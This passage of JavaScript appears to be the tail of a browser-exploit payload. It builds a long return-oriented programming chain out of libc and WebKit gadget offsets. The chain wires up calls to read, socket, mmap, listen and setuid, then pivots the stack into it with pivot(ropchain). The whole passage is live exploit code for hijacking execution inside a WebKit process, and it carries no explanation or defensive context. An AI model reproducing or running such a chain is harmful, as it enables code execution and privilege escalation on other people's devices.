db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
read_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+209272, //L3605
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+209328, //L3606
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+209344, //L3607
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3598:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3599:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3600:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3601:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3602:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3605:
db([0, 0]); // 0x0
//L3604:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+209312, //L3608
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3608:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3606:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3607:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3597:
db([0, 0]); // 0x0
//L3266:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210192, //L3609
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210000, //L3610
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210016, //L3611
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210032, //L3612
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210048, //L3613
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210064, //L3614
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210080, //L3615
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+210112, //L3616
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
socket_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+210104, //L3617
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+210160, //L3618
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+210176, //L3619
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3610:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3611:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3612:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3613:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3614:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3615:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3617:
db([0, 0]); // 0x0
//L3616:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+210144, //L3620
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3620:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3618:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3619:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3609:
db([0, 0]); // 0x0
//L3074:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211024, //L3621
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210832, //L3622
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210848, //L3623
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210864, //L3624
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210880, //L3625
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210896, //L3626
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+210912, //L3627
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+210944, //L3628
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
mmap_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+210936, //L3629
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+210992, //L3630
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+211008, //L3631
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3622:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3623:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3624:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3625:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3626:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3627:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3629:
db([0, 0]); // 0x0
//L3628:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+210976, //L3632
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3632:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3630:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3631:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3621:
db([0, 0]); // 0x0
//L3340:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211856, //L3633
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211664, //L3634
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211680, //L3635
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211696, //L3636
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211712, //L3637
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211728, //L3638
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+211744, //L3639
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+211776, //L3640
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
listen_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+211768, //L3641
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+211824, //L3642
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+211840, //L3643
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3634:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3635:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3636:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3637:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3638:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3639:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3641:
db([0, 0]); // 0x0
//L3640:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+211808, //L3644
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3644:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3642:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3643:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3633:
db([0, 0]); // 0x0
//L3023:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212688, //L3645
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212496, //L3646
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212512, //L3647
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212528, //L3648
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212544, //L3649
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212560, //L3650
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+212576, //L3651
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+212608, //L3652
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
setuid_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+212600, //L3653
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+212656, //L3654
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+212672, //L3655
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3646:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3647:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3648:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3649:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3650:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3653:
db([0, 0]); // 0x0
//L3652:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+212640, //L3656
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3656:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3654:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3655:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3645:
db([0, 0]); // 0x0
//L3556:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213560, //L3657
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213240, //L3658
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213368, //L3659
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213384, //L3660
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213400, //L3661
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213416, //L3662
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213432, //L3663
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+213448, //L3664
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967224, 4294967295]); // -0x48
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+213480, //L3665
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614 //pop rcx
]);
//L3658:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+213472, //L3666
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+213528, //L3667
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+213544, //L3668
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L3659:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L3660:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L3661:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L3662:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3663:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L3664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L3666:
db([0, 0]); // 0x0
//L3665:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+213512, //L3669
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L3669:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L3667:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L3668:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L3657:
db([0, 0]); // 0x0
//L2676:
db([2, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
}catch(e){alert(e);}
